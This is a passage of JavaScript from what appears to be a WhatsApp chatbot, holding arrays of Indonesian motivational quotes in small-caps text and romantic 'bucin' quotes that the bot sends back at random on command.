"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    payreply(`"${motivasii}"`)
}
break
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
